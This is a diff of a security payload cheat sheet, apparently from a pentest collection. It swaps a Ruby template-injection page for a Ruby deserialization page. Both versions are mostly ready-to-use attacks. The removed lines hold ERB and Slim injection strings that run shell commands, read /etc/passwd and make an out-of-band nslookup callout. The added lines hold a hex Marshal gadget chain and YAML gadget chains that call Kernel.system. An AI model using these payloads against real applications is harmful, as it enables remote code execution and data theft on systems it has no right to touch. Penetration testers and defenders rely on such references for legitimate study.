@@ -1,91 +1,96 @@
-# Server Side Template Injection - Ruby
+# Ruby Deserialization
 
-> Server-Side Template Injection (SSTI)  is a vulnerability that arises when an attacker can inject malicious code into a server-side template, causing the server to execute arbitrary commands. In Ruby, SSTI can occur when using templating engines like ERB (Embedded Ruby), Haml, liquid, or Slim, especially when user input is incorporated into templates without proper sanitization or validation.
+> Ruby deserialization is the process of converting serialized data back into Ruby objects, often using formats like YAML, Marshal, or JSON. Ruby's Marshal module, for instance, is commonly used for this, as it can serialize and deserialize complex Ruby objects.
 
 ## Summary
 
-- [Templating Libraries](#templating-libraries)
-- [Universal Payloads](#universal-payloads)
-- [Ruby](#ruby)
-    - [Ruby - Basic injections](#ruby---basic-injections)
-    - [Ruby - Retrieve /etc/passwd](#ruby---retrieve-etcpasswd)
-    - [Ruby - List files and directories](#ruby---list-files-and-directories)
-    - [Ruby - Remote Command execution](#ruby---remote-command-execution)
-- [References](#references)
+* [Marshal Deserialization](#marshal-deserialization)
+* [YAML Deserialization](#yaml-deserialization)
+* [References](#references)
 
-## Templating Libraries
+## Marshal Deserialization
 
-| Template Name | Payload Format |
-|---------------|----------------|
-| Erb           | `<%= %>`       |
-| Erubi         | `<%= %>`       |
-| Erubis        | `<%= %>`       |
-| HAML          | `#{ }`         |
-| Liquid        | `{{ }}`        |
-| Mustache      | `{{ }}`        |
-| Slim          | `#{ }`         |
-
-## Universal Payloads
-
-Generic code injection payloads work for many Ruby-based template engines, such as Erb, Erubi, Erubis, HAML and Slim.
-
-To use these payloads, wrap them in the appropriate tag.
+Script to generate and verify the deserialization gadget chain against Ruby 2.0 through to 2.5
 
 ```ruby
-%x('id') # Rendered RCE
-File.read("Y:/A:/"+%x('id')) # Error-Based RCE
-1/(system("id")&&1||0) # Boolean-Based RCE
-system("id && sleep 5") # Time-Based RCE
+for i in {0..5}; do docker run -it ruby:2.${i} ruby -e 'Marshal.load(["0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d49220d7c696420313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446"].pack("H*")) rescue nil'; done
 ```
 
-## Ruby
+## YAML Deserialization
 
-### Ruby - Basic injections
-
-**ERB**:
+Vulnerable code
 
 ```ruby
-<%= 7 * 7 %>
+require "yaml"
+YAML.load(File.read("p.yml"))
 ```
 
-**Slim**:
+Universal gadget for ruby <= 2.7.2:
 
-```ruby
-#{ 7 * 7 }
+```yaml
+--- !ruby/object:Gem::Requirement
+requirements:
+  !ruby/object:Gem::DependencyList
+  specs:
+  - !ruby/object:Gem::Source::SpecificFile
+    spec: &1 !ruby/object:Gem::StubSpecification
+      loaded_from: "|id 1>&2"
+  - !ruby/object:Gem::Source::SpecificFile
+      spec:
 ```
 
-### Ruby - Retrieve /etc/passwd
+Universal gadget for ruby 2.x - 3.x.
 
-```ruby
-<%= File.open('/etc/passwd').read %>
+```yaml
+---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &1 !ruby/object:Net::BufferedIO
+      io: &1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &1 !ruby/object:Net::WriteAdapter
+         socket: &1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: id
+         method_id: :resolve
 ```
 
-### Ruby - List files and directories
-
-```ruby
-<%= Dir.entries('/') %>
-```
-
-### Ruby - Remote Command execution
-
-Execute code using SSTI for **Erb**,**Erubi**,**Erubis** engine.
-
-```ruby
-<%=(`nslookup oastify.com`)%>
-<%= system('cat /etc/passwd') %>
-<%= `ls /` %>
-<%= IO.popen('ls /').readlines()  %>
-<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
-<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
-```
-
-Execute code using SSTI for **Slim** engine.
-
-```powershell
-#{ %x|env| }
+```yaml
+ ---
+ - !ruby/object:Gem::Installer
+     i: x
+ - !ruby/object:Gem::SpecFetcher
+     i: y
+ - !ruby/object:Gem::Requirement
+   requirements:
+     !ruby/object:Gem::Package::TarReader
+     io: &1 !ruby/object:Net::BufferedIO
+       io: &1 !ruby/object:Gem::Package::TarReader::Entry
+          read: 0
+          header: "abc"
+       debug_output: &1 !ruby/object:Net::WriteAdapter
+          socket: &1 !ruby/object:Gem::RequestSet
+              sets: !ruby/object:Net::WriteAdapter
+                  socket: !ruby/module 'Kernel'
+                  method_id: :system
+              git_set: sleep 600
+          method_id: :resolve 
 ```
 
 ## References
 
-- [Ruby ERB Template Injection - Scott White & Geoff Walton - September 13, 2017](https://web.archive.org/web/20181119170413/https://www.trustedsec.com/2017/09/rubyerb-template-injection/)
-- [Successful Errors: New Code Injection and SSTI Techniques - Vladislav Korchagin - January 3, 2026](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md)
+* [Blind Remote Code Execution through YAML Deserialization - Colin McQueen - June 9, 2021](https://web.archive.org/web/20210610111705/https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/)
+* [Ruby 2.X Universal RCE Deserialization Gadget Chain - Luke Jahnke - November 8, 2018](https://web.archive.org/web/20191128020715/https://www.elttam.com.au/blog/ruby-deserialization/)
+* [Ruby 2.x Universal RCE Deserialization Gadget Chain - PentesterLab - August 17, 2019](https://web.archive.org/web/20190817140453/https://pentesterlab.com/exercises/ruby_ugadget/course)
+* [Ruby 3.4-rc Universal RCE Deserialization Gadget Chain - Luke Jahnke - November 24, 2024](https://web.archive.org/web/20260818173333/https://nastystereo.com/security/ruby-3.4-deserialization.html)
+* [Ruby 4.0 Universal RCE Deserialization Gadget Chain - elttam / Luke Jahnke - August 14, 2026](https://web.archive.org/web/20260814062024/https://www.elttam.com/blog/ruby-4-0-universal-rce-deserialization-gadget-chain)
+* [Universal RCE with Ruby YAML.load - Etienne Stalmans (@_staaldraad) - March 2, 2019](https://web.archive.org/web/20190302114631/https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/)
+* [Universal RCE with Ruby YAML.load (versions > 2.7) - Etienne Stalmans (@_staaldraad) - January 9, 2021](https://web.archive.org/web/20260201150417/https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/)
